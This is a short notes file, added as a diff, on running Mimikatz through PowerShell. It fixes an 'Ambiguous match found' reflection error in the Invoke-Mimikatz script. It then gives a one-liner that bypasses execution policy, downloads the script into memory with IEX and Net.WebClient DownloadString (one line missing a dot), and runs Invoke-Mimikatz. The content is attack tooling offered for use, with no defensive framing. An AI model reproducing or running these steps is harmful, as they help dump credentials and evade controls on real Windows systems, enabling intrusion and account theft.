@@ -1,0 +1,23 @@
+------------------------------------------------------------------------------------------------------------------------------------
+To solve the mimikatz error: 
+
+Exception calling "GetMethod" with "1" argument(s): "Ambiguous match found."
+At line:886 char:6
+    $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddr ...
+    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+CategoryInfo : NotSpecified: (:) [], MethodInvocationException
+FullyQualifiedErrorId : AmbiguousMatchException
+
+Change the following line:
+$GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
+
+To
+
+$GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [reflection.bindingflags] "Public,Static", $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null);
+------------------------------------------------------------------------------------------------------------------------------------
+Mimikatz powershell one liner:
+Enter the commands into powershell:
+powershell -ep bypass #Bypass powershell execution policy
+IEX (New-Object Net.WebClient)DownloadString('path-to-invoke-mimikatz.ps1')    #loads script into memory
+Invoke-Mimikatz    #run
+------------------------------------------------------------------------------------------------------------------------------------
